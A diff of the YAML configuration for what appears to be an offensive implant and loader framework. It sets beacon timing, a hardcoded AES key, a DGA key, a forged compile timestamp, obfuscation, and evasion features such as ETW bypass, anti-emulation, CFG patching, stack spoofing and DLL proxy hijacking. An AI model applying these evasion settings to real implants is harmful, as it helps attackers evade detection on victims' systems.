@@ -5,8 +5,9 @@ basic:
     url: ""
   cron: "*/5 * * * * * *" # cron express
   jitter: 0.2
-  server_retry: 10
-  global_retry: 1000000
+  keepalive: false
+  retry: 10             # 每个目标允许的连续失败次数
+  max_cycles: -1        # 最大循环次数，-1 表示无限循环
   encryption: aes
   key: maliceofinternal
 
@@ -21,7 +22,7 @@ basic:
     key: "malefic_dga_2024" # key
     interval_hours: 8 # generate once every 8 hours
 
-  # Guardrail
+  # Guardrail配置 - 环境检测防护
   guardrail:
     enable: false
     require_all: true
@@ -32,14 +33,12 @@ basic:
 
   targets:
   # tcp
-  - address: "127.0.0.1:5001"
-    tcp: {}
+    - address: "127.0.0.1:5001"
 
 build:
-  zigbuild: false
   obfstr: true
-  remap: false # Force refresh remap-path-prefix configuration even if it already exists
-  toolchain: "nightly-2023-09-18"
+  zigbuild: false
+  toolchain: "nightly-2024-02-03"
   ollvm:
     enable: false
     bcfobf: false # Bogus Control Flow Obfuscation
@@ -48,7 +47,6 @@ build:
     fco: false # Function CallSite  Obfuscation
     constenc: false # Constant Encryption Obfuscation
   metadata:
-    remap_path: "C:/Windows/Users/"
     icon: ""
     compile_time: "24 Jun 2015 18:03:01"
     file_version: ""
@@ -139,10 +137,20 @@ implants:
   thread_stack_spoofer: true
 
 loader:
+  evader:
+    anti_emu: true
+    etw_pass: true
+    god_speed: true
+    sleep_encrypt: false
+    anti_forensic: false
+    cfg_patch: true
+    api_untangle: false
+    normal_api: false
   proxydll:
     proxyfunc: ""
-    raw_dll: ""
+    raw_dll: "" #
     proxied_dll: ""
     proxy_dll: ""
-    block: true
-    pack_resources: false
+    pack_resources: true
+    block: false
+    hijack_dllmain: true
